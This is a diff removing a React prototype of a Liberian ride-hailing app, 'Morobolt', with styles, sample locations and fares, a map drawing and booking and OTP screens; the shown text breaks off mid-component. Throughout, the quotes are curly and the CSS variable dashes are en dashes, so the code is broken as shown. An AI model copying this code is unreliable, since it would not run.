@@ -1,1836 +1,325 @@
-import { useState, useEffect, useRef } from “react”;
-
-const COLORS = {
-primary: “#00C853”,
-primaryDark: “#007E33”,
-primaryLight: “#69F0AE”,
-accent: “#FF6D00”,
-dark: “#0A0A0A”,
-surface: “#111111”,
-card: “#1A1A1A”,
-cardHover: “#222222”,
-border: “#2A2A2A”,
-text: “#FFFFFF”,
-textMuted: “#888888”,
-textSecondary: “#CCCCCC”,
-danger: “#FF3D00”,
-warning: “#FFC107”,
-success: “#00E676”,
-};
-
-const styles = `
-@import url(‘https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500;600&display=swap’);
-
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-:root {
-–primary: ${COLORS.primary};
-–primaryDark: ${COLORS.primaryDark};
-–primaryLight: ${COLORS.primaryLight};
-–accent: ${COLORS.accent};
-–dark: ${COLORS.dark};
-–surface: ${COLORS.surface};
-–card: ${COLORS.card};
-–border: ${COLORS.border};
-–text: ${COLORS.text};
-–textMuted: ${COLORS.textMuted};
-–textSecondary: ${COLORS.textSecondary};
-–danger: ${COLORS.danger};
-–success: ${COLORS.success};
-–warning: ${COLORS.warning};
-}
-
-body { font-family: ‘DM Sans’, sans-serif; background: var(–dark); color: var(–text); overflow: hidden; }
-
-.app-container {
-width: 100%;
-max-width: 430px;
-height: 100vh;
-margin: 0 auto;
-position: relative;
-overflow: hidden;
-background: var(–dark);
-display: flex;
-flex-direction: column;
-}
-
-/* Splash */
-.splash {
-position: absolute; inset: 0; z-index: 100;
-background: var(–dark);
-display: flex; flex-direction: column;
-align-items: center; justify-content: center;
-gap: 16px;
-animation: splashOut 0.6s ease forwards 2.5s;
-}
-
-@keyframes splashOut {
-to { opacity: 0; pointer-events: none; }
-}
-
-.splash-logo {
-font-family: ‘Syne’, sans-serif;
-font-size: 52px; font-weight: 800;
-color: var(–primary);
-letter-spacing: -2px;
-animation: logoIn 0.8s cubic-bezier(0.34,1.56,0.64,1) 0.3s both;
-}
-
-.splash-logo span { color: var(–text); }
-
-@keyframes logoIn {
-from { opacity: 0; transform: scale(0.5) translateY(20px); }
-to { opacity: 1; transform: scale(1) translateY(0); }
-}
-
-.splash-tagline {
-color: var(–textMuted);
-font-size: 14px;
-animation: fadeUp 0.6s ease 1s both;
-}
-
-.splash-dot {
-width: 8px; height: 8px;
-border-radius: 50%;
-background: var(–primary);
-animation: pulse 1s ease-in-out infinite 1.5s;
-}
-
-@keyframes pulse {
-0%, 100% { transform: scale(1); opacity: 1; }
-50% { transform: scale(1.5); opacity: 0.5; }
-}
-
-@keyframes fadeUp {
-from { opacity: 0; transform: translateY(12px); }
-to { opacity: 1; transform: translateY(0); }
-}
-
-/* Auth */
-.auth-screen {
-flex: 1;
-display: flex;
-flex-direction: column;
-padding: 0;
-overflow-y: auto;
-}
-
-.auth-hero {
-height: 280px;
-background: linear-gradient(160deg, var(–primaryDark) 0%, var(–dark) 70%);
-position: relative;
-overflow: hidden;
-display: flex;
-align-items: flex-end;
-padding: 24px;
-flex-shrink: 0;
-}
-
-.auth-hero::before {
-content: ‘’;
-position: absolute;
-width: 300px; height: 300px;
-border-radius: 50%;
-background: radial-gradient(circle, rgba(0,200,83,0.15) 0%, transparent 70%);
-top: -80px; right: -80px;
-}
-
-.auth-map-grid {
-position: absolute;
-inset: 0;
-opacity: 0.07;
-background-image:
-linear-gradient(var(–primary) 1px, transparent 1px),
-linear-gradient(90deg, var(–primary) 1px, transparent 1px);
-background-size: 40px 40px;
-}
-
-.auth-hero-content { position: relative; z-index: 1; }
-.auth-hero-title {
-font-family: ‘Syne’, sans-serif;
-font-size: 38px; font-weight: 800;
-line-height: 1.1;
-color: var(–text);
-}
-
-.auth-hero-title .highlight { color: var(–primary); }
-
-.auth-hero-sub { color: var(–textSecondary); font-size: 14px; margin-top: 8px; }
-
-.auth-body { padding: 28px 24px; flex: 1; }
-
-.auth-tabs {
-display: flex;
-background: var(–card);
-border-radius: 12px;
-padding: 4px;
-margin-bottom: 24px;
-}
-
-.auth-tab {
-flex: 1; padding: 10px;
-border: none; border-radius: 10px;
-font-family: ‘DM Sans’, sans-serif;
-font-size: 14px; font-weight: 600;
-cursor: pointer;
-transition: all 0.2s;
-background: transparent;
-color: var(–textMuted);
-}
-
-.auth-tab.active {
-background: var(–primary);
-color: var(–dark);
-}
-
-.form-group { margin-bottom: 16px; }
-
-.form-label {
-display: block;
-font-size: 12px; font-weight: 600;
-color: var(–textMuted);
-text-transform: uppercase;
-letter-spacing: 0.8px;
-margin-bottom: 8px;
-}
-
-.form-input {
-width: 100%;
-background: var(–card);
-border: 1.5px solid var(–border);
-border-radius: 12px;
-padding: 14px 16px;
-color: var(–text);
-font-family: ‘DM Sans’, sans-serif;
-font-size: 15px;
-outline: none;
-transition: border-color 0.2s;
-}
-
-.form-input:focus { border-color: var(–primary); }
-.form-input::placeholder { color: var(–textMuted); }
-
-.phone-input-wrap {
-display: flex;
-gap: 8px;
-}
-
-.country-code {
-background: var(–card);
-border: 1.5px solid var(–border);
-border-radius: 12px;
-padding: 14px 12px;
-color: var(–text);
-font-size: 15px;
-white-space: nowrap;
-display: flex; align-items: center; gap: 6px;
-min-width: 90px;
-}
-
-.btn-primary {
-width: 100%;
-background: var(–primary);
-color: var(–dark);
-border: none;
-border-radius: 14px;
-padding: 16px;
-font-family: ‘Syne’, sans-serif;
-font-size: 16px; font-weight: 700;
-cursor: pointer;
-transition: all 0.2s;
-margin-top: 8px;
-}
-
-.btn-primary:hover { background: var(–primaryLight); transform: translateY(-1px); }
-.btn-primary:active { transform: translateY(0); }
-
-.btn-secondary {
-width: 100%;
-background: transparent;
-color: var(–primary);
-border: 1.5px solid var(–primary);
-border-radius: 14px;
-padding: 16px;
-font-family: ‘Syne’, sans-serif;
-font-size: 15px; font-weight: 600;
-cursor: pointer;
-transition: all 0.2s;
-margin-top: 8px;
-}
-
-.btn-secondary:hover { background: rgba(0,200,83,0.1); }
-
-.divider {
-text-align: center;
-color: var(–textMuted);
-font-size: 13px;
-margin: 16px 0;
-position: relative;
-}
-
-.divider::before, .divider::after {
-content: ‘’;
-position: absolute;
-top: 50%;
-width: calc(50% - 30px);
-height: 1px;
-background: var(–border);
-}
-
-.divider::before { left: 0; }
-.divider::after { right: 0; }
-
-/* Bottom Nav */
-.bottom-nav {
-display: flex;
-background: var(–surface);
-border-top: 1px solid var(–border);
-padding: 8px 0 16px;
-position: relative;
-z-index: 50;
-flex-shrink: 0;
-}
-
-.nav-item {
-flex: 1;
-display: flex;
-flex-direction: column;
-align-items: center;
-gap: 4px;
-padding: 8px 0;
-cursor: pointer;
-border: none;
-background: transparent;
-color: var(–textMuted);
-font-family: ‘DM Sans’, sans-serif;
-font-size: 11px;
-transition: all 0.2s;
-}
-
-.nav-item.active { color: var(–primary); }
-
-.nav-icon {
-font-size: 22px;
-transition: transform 0.2s;
-}
-
-.nav-item.active .nav-icon { transform: translateY(-2px); }
-
-/* Map Screen */
-.map-screen {
-flex: 1;
-display: flex;
-flex-direction: column;
-position: relative;
-overflow: hidden;
-}
-
-.map-area {
-flex: 1;
-position: relative;
-background: #1a2332;
-overflow: hidden;
-}
-
-.map-svg { width: 100%; height: 100%; position: absolute; inset: 0; }
-
-.map-overlay-top {
-position: absolute;
-top: 0; left: 0; right: 0;
-z-index: 10;
-padding: 16px;
-background: linear-gradient(to bottom, rgba(0,0,0,0.7) 0%, transparent 100%);
-}
-
-.greeting-bar {
-display: flex;
-align-items: center;
-justify-content: space-between;
-margin-bottom: 12px;
-}
-
-.greeting-text { font-size: 14px; color: var(–textSecondary); }
-.greeting-name { font-family: ‘Syne’, sans-serif; font-size: 18px; font-weight: 700; }
-
-.avatar-btn {
-width: 40px; height: 40px;
-border-radius: 50%;
-background: var(–primary);
-border: none; cursor: pointer;
-display: flex; align-items: center; justify-content: center;
-font-size: 18px;
-color: var(–dark);
-font-family: ‘Syne’, sans-serif;
-font-weight: 800;
-}
-
-.search-box {
-background: rgba(17,17,17,0.95);
-border-radius: 14px;
-border: 1px solid var(–border);
-padding: 14px 16px;
-display: flex; align-items: center; gap: 10px;
-cursor: pointer;
-backdrop-filter: blur(10px);
-}
-
-.search-box-text { color: var(–textMuted); font-size: 15px; flex: 1; }
-
-/* Booking Panel */
-.booking-panel {
-position: absolute;
-bottom: 0; left: 0; right: 0;
-background: var(–surface);
-border-radius: 24px 24px 0 0;
-padding: 24px;
-z-index: 20;
-box-shadow: 0 -8px 40px rgba(0,0,0,0.5);
-max-height: 70vh;
-overflow-y: auto;
-transition: transform 0.4s cubic-bezier(0.32, 0.72, 0, 1);
-}
-
-.panel-handle {
-width: 40px; height: 4px;
-background: var(–border);
-border-radius: 2px;
-margin: 0 auto 20px;
-}
-
-.panel-title {
-font-family: ‘Syne’, sans-serif;
-font-size: 20px; font-weight: 700;
-margin-bottom: 16px;
-}
-
-.location-inputs {
-background: var(–card);
-border-radius: 14px;
-overflow: hidden;
-margin-bottom: 16px;
-}
-
-.location-row {
-display: flex; align-items: center; gap: 12px;
-padding: 14px 16px;
-cursor: pointer;
-transition: background 0.15s;
-}
-
-.location-row:hover { background: var(–cardHover); }
-.location-row:not(:last-child) { border-bottom: 1px solid var(–border); }
-
-.location-dot {
-width: 10px; height: 10px;
-border-radius: 50%;
-flex-shrink: 0;
-}
-
-.dot-green { background: var(–primary); }
-.dot-orange { background: var(–accent); }
-
-.location-label { font-size: 13px; color: var(–textMuted); display: block; }
-.location-value { font-size: 15px; font-weight: 500; }
-
-.location-connector {
-width: 1px; height: 20px;
-background: var(–border);
-margin-left: 21px;
-}
-
-/* Vehicle Types */
-.section-title {
-font-size: 13px; font-weight: 600;
-color: var(–textMuted);
-text-transform: uppercase;
-letter-spacing: 0.8px;
-margin-bottom: 12px;
-}
-
-.vehicle-scroll {
-display: flex; gap: 10px;
-overflow-x: auto;
-padding-bottom: 4px;
--webkit-overflow-scrolling: touch;
-scrollbar-width: none;
-margin-bottom: 20px;
-}
-
-.vehicle-scroll::-webkit-scrollbar { display: none; }
-
-.vehicle-card {
-background: var(–card);
-border: 1.5px solid var(–border);
-border-radius: 14px;
-padding: 14px 16px;
-min-width: 120px;
-cursor: pointer;
-transition: all 0.2s;
-flex-shrink: 0;
-text-align: center;
-}
-
-.vehicle-card.selected {
-border-color: var(–primary);
-background: rgba(0,200,83,0.08);
-}
-
-.vehicle-icon { font-size: 32px; margin-bottom: 6px; display: block; }
-.vehicle-name { font-weight: 600; font-size: 14px; display: block; }
-.vehicle-time { font-size: 12px; color: var(–textMuted); }
-.vehicle-price { font-size: 13px; color: var(–primary); font-weight: 700; margin-top: 4px; display: block; }
-
-/* Promo */
-.promo-row {
-display: flex; align-items: center; gap: 10px;
-background: var(–card);
-border-radius: 12px;
-padding: 12px 14px;
-margin-bottom: 16px;
-cursor: pointer;
-}
-
-.promo-icon { font-size: 20px; }
-.promo-text { flex: 1; font-size: 14px; color: var(–textSecondary); }
-.promo-arrow { color: var(–textMuted); }
-
-/* Ride in progress */
-.ride-card {
-background: var(–card);
-border-radius: 16px;
-padding: 16px;
-margin-bottom: 16px;
-}
-
-.driver-row {
-display: flex; align-items: center; gap: 14px;
-margin-bottom: 14px;
-}
-
-.driver-avatar {
-width: 52px; height: 52px;
-border-radius: 50%;
-background: linear-gradient(135deg, var(–primary), var(–primaryDark));
-display: flex; align-items: center; justify-content: center;
-font-size: 22px;
-}
-
-.driver-info { flex: 1; }
-.driver-name { font-weight: 700; font-size: 16px; }
-.driver-rating { font-size: 13px; color: var(–warning); }
-.driver-plate {
-background: var(–surface);
-padding: 6px 12px;
-border-radius: 8px;
-font-size: 13px; font-weight: 700;
-letter-spacing: 1px;
-}
-
-.action-btns { display: flex; gap: 10px; }
-
-.action-btn {
-flex: 1;
-background: var(–surface);
-border: 1.5px solid var(–border);
-border-radius: 12px;
-padding: 12px;
-display: flex; flex-direction: column;
-align-items: center; gap: 4px;
-cursor: pointer;
-font-size: 20px;
-color: var(–text);
-transition: all 0.2s;
-}
-
-.action-btn:hover { border-color: var(–primary); }
-.action-btn span { font-size: 11px; color: var(–textMuted); }
-
-.eta-bar {
-background: rgba(0,200,83,0.1);
-border: 1px solid rgba(0,200,83,0.3);
-border-radius: 12px;
-padding: 12px 16px;
-display: flex; align-items: center; gap: 10px;
-margin-bottom: 12px;
-}
-
-.eta-text { font-size: 14px; }
-.eta-time { font-family: ‘Syne’, sans-serif; font-size: 20px; font-weight: 800; color: var(–primary); }
-
-/* Activities Screen */
-.screen-header {
-padding: 20px 20px 0;
-flex-shrink: 0;
-}
-
-.screen-title {
-font-family: ‘Syne’, sans-serif;
-font-size: 26px; font-weight: 800;
-margin-bottom: 4px;
-}
-
-.screen-sub { font-size: 14px; color: var(–textMuted); }
-
-.screen-body { flex: 1; overflow-y: auto; padding: 16px 20px; }
-
-.trip-item {
-display: flex; align-items: center; gap: 14px;
-padding: 16px;
-background: var(–card);
-border-radius: 14px;
-margin-bottom: 10px;
-cursor: pointer;
-transition: background 0.15s;
-}
-
-.trip-item:hover { background: var(–cardHover); }
-
-.trip-icon {
-width: 44px; height: 44px;
-border-radius: 12px;
-background: rgba(0,200,83,0.1);
-display: flex; align-items: center; justify-content: center;
-font-size: 20px;
-flex-shrink: 0;
-}
-
-.trip-info { flex: 1; }
-.trip-route { font-weight: 600; font-size: 14px; }
-.trip-date { font-size: 12px; color: var(–textMuted); margin-top: 2px; }
-.trip-price { font-family: ‘Syne’, sans-serif; font-weight: 700; color: var(–primary); }
-
-.trip-status {
-font-size: 11px; font-weight: 600;
-padding: 3px 8px;
-border-radius: 6px;
-margin-top: 4px;
-display: inline-block;
-}
-
-.status-completed { background: rgba(0,230,118,0.1); color: var(–success); }
-.status-cancelled { background: rgba(255,61,0,0.1); color: var(–danger); }
-
-/* Profile Screen */
-.profile-hero {
-padding: 24px 20px;
-background: linear-gradient(135deg, rgba(0,200,83,0.15) 0%, transparent 60%);
-display: flex; align-items: center; gap: 16px;
-border-bottom: 1px solid var(–border);
-flex-shrink: 0;
-}
-
-.profile-avatar {
-width: 72px; height: 72px;
-border-radius: 50%;
-background: linear-gradient(135deg, var(–primary), var(–primaryDark));
-display: flex; align-items: center; justify-content: center;
-font-family: ‘Syne’, sans-serif;
-font-size: 28px; font-weight: 800;
-color: var(–dark);
-}
-
-.profile-name { font-family: ‘Syne’, sans-serif; font-size: 22px; font-weight: 800; }
-.profile-phone { font-size: 14px; color: var(–textMuted); margin-top: 2px; }
-.profile-rating { font-size: 13px; color: var(–warning); margin-top: 4px; }
-
-.settings-list { padding: 16px 20px; overflow-y: auto; flex: 1; }
-
-.settings-section { margin-bottom: 24px; }
-.settings-section-title {
-font-size: 12px; font-weight: 600;
-color: var(–textMuted);
-text-transform: uppercase;
-letter-spacing: 0.8px;
-margin-bottom: 10px;
-padding-left: 4px;
-}
-
-.settings-item {
-display: flex; align-items: center; gap: 14px;
-padding: 14px 16px;
-background: var(–card);
-border-radius: 12px;
-margin-bottom: 8px;
-cursor: pointer;
-transition: background 0.15s;
-}
-
-.settings-item:hover { background: var(–cardHover); }
-.settings-item-icon { font-size: 20px; width: 24px; text-align: center; }
-.settings-item-text { flex: 1; font-size: 15px; }
-.settings-item-arrow { color: var(–textMuted); font-size: 12px; }
-.settings-item-badge {
-background: var(–primary); color: var(–dark);
-font-size: 11px; font-weight: 700;
-padding: 2px 8px; border-radius: 20px;
-}
-
-/* Wallet */
-.wallet-card {
-background: linear-gradient(135deg, var(–primaryDark) 0%, #004d20 100%);
-border-radius: 20px;
-padding: 24px;
-margin-bottom: 20px;
-position: relative;
-overflow: hidden;
-}
-
-.wallet-card::before {
-content: ‘’;
-position: absolute;
-width: 200px; height: 200px;
-border-radius: 50%;
-background: rgba(255,255,255,0.05);
-right: -60px; top: -60px;
-}
-
-.wallet-label { font-size: 13px; color: rgba(255,255,255,0.7); margin-bottom: 6px; }
-.wallet-balance {
-font-family: ‘Syne’, sans-serif;
-font-size: 40px; font-weight: 800;
-color: white;
-}
-
-.wallet-currency { font-size: 18px; color: rgba(255,255,255,0.7); }
-
-.wallet-actions { display: flex; gap: 10px; margin-top: 20px; }
-.wallet-action-btn {
-flex: 1;
-background: rgba(255,255,255,0.15);
-border: 1px solid rgba(255,255,255,0.2);
-border-radius: 12px;
-padding: 10px;
-color: white;
-font-size: 13px; font-weight: 600;
-cursor: pointer;
-text-align: center;
-transition: background 0.2s;
-font-family: ‘DM Sans’, sans-serif;
-}
-
-.wallet-action-btn:hover { background: rgba(255,255,255,0.25); }
-
-/* Toast */
-.toast {
-position: fixed;
-top: 20px; left: 50%; transform: translateX(-50%);
-background: var(–card);
-border: 1px solid var(–primary);
-border-radius: 12px;
-padding: 12px 20px;
-font-size: 14px;
-z-index: 1000;
-animation: toastIn 0.3s ease both, toastOut 0.3s ease forwards 2.5s;
-white-space: nowrap;
-box-shadow: 0 8px 32px rgba(0,0,0,0.4);
-}
-
-@keyframes toastIn { from { opacity: 0; top: 0; } to { opacity: 1; top: 20px; } }
-@keyframes toastOut { to { opacity: 0; top: 0; } }
-
-/* OTP */
-.otp-wrap { display: flex; gap: 10px; justify-content: center; margin: 20px 0; }
-.otp-box {
-width: 52px; height: 60px;
-background: var(–card);
-border: 1.5px solid var(–border);
-border-radius: 12px;
-text-align: center;
-font-size: 24px; font-weight: 700;
-color: var(–text);
-font-family: ‘Syne’, sans-serif;
-outline: none;
-}
-
-.otp-box:focus { border-color: var(–primary); }
-
-/* Map Markers */
-.map-car {
-position: absolute;
-font-size: 24px;
-animation: carMove 4s ease-in-out infinite alternate;
-filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5));
-}
-
-@keyframes carMove {
-from { transform: translate(0,0) rotate(0deg); }
-to { transform: translate(30px,-20px) rotate(5deg); }
-}
-
-.pulse-marker {
-position: absolute;
-width: 20px; height: 20px;
-border-radius: 50%;
-background: var(–primary);
-}
-
-.pulse-marker::before {
-content: ‘’;
-position: absolute;
-inset: -8px;
-border-radius: 50%;
-border: 2px solid var(–primary);
-opacity: 0.5;
-animation: ringPulse 1.5s ease-out infinite;
-}
-
-@keyframes ringPulse {
-from { transform: scale(0.8); opacity: 0.8; }
-to { transform: scale(1.8); opacity: 0; }
-}
-
-/* Cancel Modal */
-.modal-overlay {
-position: absolute; inset: 0; z-index: 100;
-background: rgba(0,0,0,0.8);
-display: flex; align-items: flex-end;
-backdrop-filter: blur(4px);
-}
-
-.modal-sheet {
-width: 100%;
-background: var(–surface);
-border-radius: 24px 24px 0 0;
-padding: 24px;
-}
-
-.modal-title {
-font-family: ‘Syne’, sans-serif;
-font-size: 20px; font-weight: 700;
-margin-bottom: 8px;
-}
-
-.modal-sub { color: var(–textMuted); font-size: 14px; margin-bottom: 20px; }
-
-.cancel-reason {
-padding: 14px 16px;
-background: var(–card);
-border-radius: 12px;
-margin-bottom: 8px;
-cursor: pointer;
-font-size: 15px;
-transition: background 0.15s;
-}
-
-.cancel-reason:hover { background: var(–cardHover); }
-
-.btn-danger {
-width: 100%;
-background: var(–danger);
-color: white;
-border: none;
-border-radius: 14px;
-padding: 16px;
-font-family: ‘Syne’, sans-serif;
-font-size: 16px; font-weight: 700;
-cursor: pointer;
-margin-top: 16px;
-}
-
-.tag-chip {
-display: inline-flex; align-items: center; gap: 4px;
-background: rgba(0,200,83,0.1);
-border: 1px solid rgba(0,200,83,0.3);
-border-radius: 20px;
-padding: 4px 12px;
-font-size: 12px; font-weight: 600;
-color: var(–primary);
-margin-right: 6px; margin-bottom: 6px;
-}
-
-.payment-option {
-display: flex; align-items: center; gap: 12px;
-padding: 14px 16px;
-background: var(–card);
-border-radius: 12px;
-margin-bottom: 8px;
-cursor: pointer;
-border: 1.5px solid transparent;
-transition: all 0.2s;
-}
-
-.payment-option.selected { border-color: var(–primary); background: rgba(0,200,83,0.06); }
-.payment-icon { font-size: 24px; }
-.payment-label { flex: 1; font-size: 15px; font-weight: 500; }
-.payment-detail { font-size: 13px; color: var(–textMuted); }
-.payment-check { color: var(–primary); font-size: 18px; }
-
-/* Safety Screen */
-.safety-card {
-background: var(–card);
-border-radius: 14px;
-padding: 16px;
-margin-bottom: 10px;
-display: flex; gap: 14px;
-align-items: flex-start;
-}
-
-.safety-icon {
-width: 44px; height: 44px;
-border-radius: 12px;
-display: flex; align-items: center; justify-content: center;
-font-size: 22px;
-flex-shrink: 0;
-}
-
-.safety-icon.red { background: rgba(255,61,0,0.15); }
-.safety-icon.blue { background: rgba(41,182,246,0.15); }
-.safety-icon.green { background: rgba(0,200,83,0.15); }
-.safety-icon.yellow { background: rgba(255,193,7,0.15); }
-
-.safety-title { font-weight: 700; font-size: 15px; margin-bottom: 4px; }
-.safety-desc { font-size: 13px; color: var(–textMuted); line-height: 1.5; }
-
-.sos-btn {
-width: 100%; background: var(–danger);
-color: white; border: none; border-radius: 14px;
-padding: 18px; font-family: ‘Syne’, sans-serif;
-font-size: 18px; font-weight: 800;
-cursor: pointer; margin-top: 20px;
-display: flex; align-items: center; justify-content: center; gap: 10px;
-animation: sosPulse 2s ease-in-out infinite;
-}
-
-@keyframes sosPulse {
-0%, 100% { box-shadow: 0 0 0 0 rgba(255,61,0,0.4); }
-50% { box-shadow: 0 0 0 12px rgba(255,61,0,0); }
-}
-
-.scroll-x { overflow-x: auto; -webkit-overflow-scrolling: touch; scrollbar-width: none; }
-.scroll-x::-webkit-scrollbar { display: none; }
-
-.location-suggestion {
-display: flex; align-items: center; gap: 12px;
-padding: 14px 16px;
-cursor: pointer;
-border-bottom: 1px solid var(–border);
-transition: background 0.15s;
-}
-
-.location-suggestion:hover { background: var(–cardHover); }
-.loc-icon {
-width: 36px; height: 36px;
-border-radius: 10px;
-background: var(–card);
-display: flex; align-items: center; justify-content: center;
-font-size: 16px;
-flex-shrink: 0;
-}
-
-.loc-name { font-size: 15px; font-weight: 500; }
-.loc-addr { font-size: 12px; color: var(–textMuted); }
-
-input::-webkit-inner-spin-button,
-input::-webkit-outer-spin-button { -webkit-appearance: none; }
-
-.shimmer {
-background: linear-gradient(90deg, var(–card) 25%, var(–cardHover) 50%, var(–card) 75%);
-background-size: 200% 100%;
-animation: shimmer 1.5s infinite;
-border-radius: 8px;
-}
-
-@keyframes shimmer {
-0% { background-position: -200% 0; }
-100% { background-position: 200% 0; }
-}
-
-/* Promotions */
-.promo-banner {
-background: linear-gradient(135deg, #FF6D00, #FF9800);
-border-radius: 16px;
-padding: 20px;
-margin-bottom: 12px;
-position: relative;
-overflow: hidden;
-}
-
-.promo-banner::after {
-content: ‘🎉’;
-position: absolute;
-right: 16px; top: 50%; transform: translateY(-50%);
-font-size: 40px;
-opacity: 0.3;
-}
-
-.promo-banner-title { font-family: ‘Syne’, sans-serif; font-size: 18px; font-weight: 800; }
-.promo-banner-sub { font-size: 13px; color: rgba(255,255,255,0.8); margin-top: 4px; }
-.promo-code {
-background: rgba(255,255,255,0.2);
-border: 1px dashed rgba(255,255,255,0.6);
-border-radius: 8px;
-padding: 6px 14px;
-display: inline-block;
-font-family: ‘Syne’, sans-serif;
-font-size: 16px; font-weight: 800;
-margin-top: 12px;
-letter-spacing: 2px;
-}
-`;
-
-const LIBERIA_LOCATIONS = [
-{ name: “Broad Street”, addr: “Monrovia City Center”, icon: “🏢” },
-{ name: “Roberts International Airport”, addr: “Margibi County”, icon: “✈️” },
-{ name: “University of Liberia”, addr: “Capitol Hill, Monrovia”, icon: “🎓” },
-{ name: “Waterside Market”, addr: “Central Monrovia”, icon: “🛒” },
-{ name: “Mamba Point Hotel”, addr: “Mamba Point, Monrovia”, icon: “🏨” },
-{ name: “SKD Sports Complex”, addr: “Paynesville”, icon: “🏟️” },
-{ name: “Redlight Market”, addr: “Paynesville”, icon: “🛍️” },
-{ name: “Duala Market”, addr: “Sinkor, Monrovia”, icon: “🏬” },
-{ name: “Tubmanburg”, addr: “Bomi County”, icon: “📍” },
-{ name: “Buchanan”, addr: “Grand Bassa County”, icon: “📍” },
-];
-
-const VEHICLE_TYPES = [
-{ id: “moro-x”, icon: “🚗”, name: “Moro X”, desc: “Sedan”, time: “3 min”, price: “LD 350”, priceNum: 350 },
-{ id: “moro-xl”, icon: “🚐”, name: “Moro XL”, desc: “SUV/Van”, time: “5 min”, price: “LD 550”, priceNum: 550 },
-{ id: “moro-bike”, icon: “🏍️”, name: “Moro Bike”, desc: “Okada”, time: “2 min”, price: “LD 150”, priceNum: 150 },
-{ id: “moro-tuk”, icon: “🛺”, name: “Moro Tuk”, desc: “3-Wheeler”, time: “4 min”, price: “LD 200”, priceNum: 200 },
-{ id: “moro-eco”, icon: “⚡”, name: “Moro Eco”, desc: “Electric”, time: “6 min”, price: “LD 400”, priceNum: 400 },
-];
-
-const PAST_TRIPS = [
-{ from: “Broad St”, to: “Mamba Point”, date: “Today, 09:14 AM”, price: “LD 350”, icon: “🚗”, status: “completed” },
-{ from: “Waterside”, to: “University of Liberia”, date: “Yesterday, 3:30 PM”, price: “LD 150”, icon: “🏍️”, status: “completed” },
-{ from: “SKD Complex”, to: “Redlight Market”, date: “Feb 22, 11:00 AM”, price: “LD 200”, icon: “🛺”, status: “completed” },
-{ from: “Duala Market”, to: “Roberts Airport”, date: “Feb 20, 7:45 AM”, price: “LD 700”, icon: “🚗”, status: “cancelled” },
-{ from: “Capitol Hill”, to: “Buchanan”, date: “Feb 18, 8:00 AM”, price: “LD 2,500”, icon: “🚐”, status: “completed” },
-];
-
-function MapBackground() {
-return (
-<svg className="map-svg" viewBox="0 0 430 500" preserveAspectRatio="xMidYMid slice">
-{/* Road network */}
-<rect width="430" height="500" fill="#1a2332"/>
-{/* Grid roads */}
-<g stroke="#243044" strokeWidth="12" fill="none">
-<line x1="0" y1="100" x2="430" y2="100"/>
-<line x1="0" y1="200" x2="430" y2="200"/>
-<line x1="0" y1="300" x2="430" y2="300"/>
-<line x1="0" y1="400" x2="430" y2="400"/>
-<line x1="80" y1="0" x2="80" y2="500"/>
-<line x1="180" y1="0" x2="180" y2="500"/>
-<line x1="280" y1="0" x2="280" y2="500"/>
-<line x1="380" y1="0" x2="380" y2="500"/>
-</g>
-{/* Road markings */}
-<g stroke="#2a3a50" strokeWidth="2" strokeDasharray="20,20">
-<line x1="0" y1="100" x2="430" y2="100"/>
-<line x1="0" y1="200" x2="430" y2="200"/>
-<line x1="0" y1="300" x2="430" y2="300"/>
-<line x1="80" y1="0" x2="80" y2="500"/>
-<line x1="180" y1="0" x2="180" y2="500"/>
-<line x1="280" y1="0" x2="280" y2="500"/>
-</g>
-{/* Block fills */}
-<rect x="90" y="110" width="80" height="80" rx="4" fill="#1f2d3f"/>
-<rect x="190" y="110" width="80" height="80" rx="4" fill="#1f2d3f"/>
-<rect x="290" y="110" width="80" height="80" rx="4" fill="#1f2d3f"/>
-<rect x="90" y="210" width="80" height="80" rx="4" fill="#1f2d3f"/>
-<rect x="190" y="210" width="80" height="80" rx="4" fill="#1f2d3f"/>
-<rect x="290" y="210" width="80" height="80" rx="4" fill="#1f2d3f"/>
-<rect x="90" y="310" width="80" height="80" rx="4" fill="#1f2d3f"/>
-<rect x="190" y="310" width="80" height="80" rx="4" fill="#1f2d3f"/>
-<rect x="290" y="310" width="80" height="80" rx="4" fill="#1f2d3f"/>
-{/* Green areas */}
-<ellipse cx="135" cy="255" rx="20" ry="15" fill="#1d3a25" opacity="0.8"/>
-<ellipse cx="235" cy="155" rx="15" ry="12" fill="#1d3a25" opacity="0.8"/>
-</svg>
-);
-}
-
-export default function MoroboltApp() {
-const [screen, setScreen] = useState(“splash”);
-const [authMode, setAuthMode] = useState(“login”);
-const [activeTab, setActiveTab] = useState(“home”);
-const [rideState, setRideState] = useState(“idle”); // idle | searching | found | inprogress | rating
-const [selectedVehicle, setSelectedVehicle] = useState(“moro-x”);
-const [selectedPayment, setSelectedPayment] = useState(“cash”);
-const [showDestination, setShowDestination] = useState(false);
-const [showCancel, setShowCancel] = useState(false);
-const [toast, setToast] = useState(null);
-const [searchStep, setSearchStep] = useState(0); // 0=pickup, 1=dropoff
-const [searchQuery, setSearchQuery] = useState(””);
-const [selectedPickup, setSelectedPickup] = useState(“Broad Street, Monrovia”);
-const [selectedDrop, setSelectedDrop] = useState(””);
-const [rating, setRating] = useState(0);
-const [otpValues, setOtpValues] = useState([””, “”, “”, “”]);
-const [phone, setPhone] = useState(””);
-const [firstName, setFirstName] = useState(””);
-const [lastName, setLastName] = useState(””);
-const [showOtp, setShowOtp] = useState(false);
-const [eta, setEta] = useState(3);
-const etaRef = useRef(null);
-
-useEffect(() => {
-const t = setTimeout(() => setScreen(“auth”), 3100);
-return () => clearTimeout(t);
-}, []);
-
-const showToast = (msg) => {
-setToast(msg);
-setTimeout(() => setToast(null), 3000);
-};
-
-const handleLogin = () => {
-if (!phone) { showToast(“⚠️ Enter your phone number”); return; }
-setShowOtp(true);
-};
-
-const handleOtpVerify = () => {
-const code = otpValues.join(””);
-if (code.length < 4) { showToast(“Enter the 4-digit OTP”); return; }
-showToast(“✅ Verified! Welcome to Morobolt!”);
-setTimeout(() => { setScreen(“main”); setActiveTab(“home”); }, 800);
-};
-
-const handleBookRide = () => {
-if (!selectedDrop) { showToast(“⚠️ Please set a destination”); return; }
-setRideState(“searching”);
-setShowDestination(false);
-setTimeout(() => {
-setRideState(“found”);
-setEta(3);
-etaRef.current = setInterval(() => {
-setEta(e => {
-if (e <= 1) {
-clearInterval(etaRef.current);
-setRideState(“inprogress”);
-return 0;
-}
-return e - 1;
-});
-}, 60000);
-}, 3500);
-};
-
-const handleCancelRide = () => {
-clearInterval(etaRef.current);
-setRideState(“idle”);
-setShowCancel(false);
-showToast(“Ride cancelled”);
-};
-
